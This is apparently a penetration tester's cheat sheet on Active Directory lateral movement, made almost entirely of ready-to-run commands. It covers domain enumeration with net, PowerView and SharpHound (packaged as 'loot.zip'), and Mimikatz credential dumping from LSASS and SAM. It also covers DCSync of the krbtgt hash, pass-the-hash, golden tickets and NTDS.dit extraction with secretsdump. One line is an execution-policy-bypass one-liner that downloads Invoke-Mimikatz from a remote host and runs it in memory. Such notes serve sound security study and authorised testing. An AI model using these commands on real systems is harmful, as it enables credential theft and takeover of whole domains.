# Lateral Movement  
## Contents 
- [Lateral Movement](#lateral-movement)
  * [Contents](#contents)
  * [What to Look For](#what-to-look-for)
  * [Quick Commands](#quick-commands)
  * [Post Exploitation Enumeration](#post-exploitation-enumeration)
    + [PowerView](#powerview)
  * [Bloodhound](#bloodhound)
  * [Mimikatz](#mimikatz)
  
## What to Look For 
Post Initial Exploitation  
Enumerate users and groups on the host.     
What privilege level does your user have?       
Is privilege escalation needed?       

## Quick Commands  

    net user
    net user /domain
    net user [username] /domain
    
    net localgroup
    net group /domain
    net group /domain "Domain Admins"  
    
PowerShell Active Directory Module (only on DC by default)

    Get-ADUser
    Get-ADDomain
    Get-ADGroup
    Get-ADGroupMember -identity "Domain Admins" -Domain test.local -DomainController 10.10.10.10
    Find-DomainShare   
    
## Post Exploitation Enumeration      
### PowerView   
Powershell script to enum domain after gaining admin access to machine   

[PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)   
[PowerView Cheat Sheet](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)    
[Cheat sheet](https://hackersinterview.com/oscp/oscp-cheatsheet-powerview-commands/)   

    powershell -ep bypass   
    . .\PowerView.ps1   
    Get-NetDomain   
    Get-NetUser   
    Get-NetComputer -fulldata   
    
## Bloodhound    
[Bloodhound](https://github.com/BloodHoundAD/BloodHound)   
Bloodhound - GUI app installed on attack box, SharpHound - powershell script to enum and collect data -> exfiltrate as a zip file.     

    apt-get install bloodhound     

on victim, transfer file then import into Bloodhound and run queries   

    . .\SharpHound.ps1   
    Invoke-Bloodhound -CollectionMethod All -Domain CONTROLLER.local -ZipFileName loot.zip        
    
## Mimikatz  
Extracts passwords, hashes, PIN codes and kerberos tickets from memory.   
[Mimikatz and Password Dumps Reference](https://ivanitlearning.wordpress.com/2019/09/07/mimikatz-and-password-dumps/)    
[Online Password Cracker - Crackstation](https://crackstation.net/)     
[Dumping Hashes with Mimikatz - Video](https://www.youtube.com/watch?v=AZirvtZNIEw)   
Loading Powershell Script 

    powershell.exe-exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1');Invoke-Mimikatz -DumpCreds"    
   
    privilege::debug   
    lsadump::sam   

Dumping credentials from LSASS  

    mimikatz # privilege::debug   
    mimikatz # sekurlsa::logonpasswords   
Dumping credentials from a minidump   

    mimikatz # sekurlsa::minidump lsass.dmp   
    mimikatz # sekurlsa::logonPasswords   
    
DCSync the krbtgt hash  

    mimikatz # lsadump::dcsync /domain:<domain> /user:krbtgt   
Pass the hash   
    
    mimikatz # sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash> /run:<cmd>   
Golden ticket creation and pass the ticket   
    
    mimikatz # kerberos::golden /user:<username> /domain:<domain> /sid:<domain_sid> /krbtgt:<krbtgt_hash>   
    
## AD Password Files  
NTSDS.dit (db) and SYSTEM registry hive. Can use built in ntdsutil.exe to backup AD. Then use another tool to extract DC hashes, since NTDS.dit is encrypted and opened exclusively for use by OS (can't be copied).     
Back up AD files:    

    ntdsutil           
    activate instance ntds     
    ifm          #commands will generate backup of data in C:\ntds directory. Crack locally.    
    
Then locally extract NTDS.dit and SYSTEM registry data using Impacket script secretsdump.py  

    $ python secretsdump.py -system registry/SYSTEM -ntds Active\ Directory/ntds.dit LOCAL        
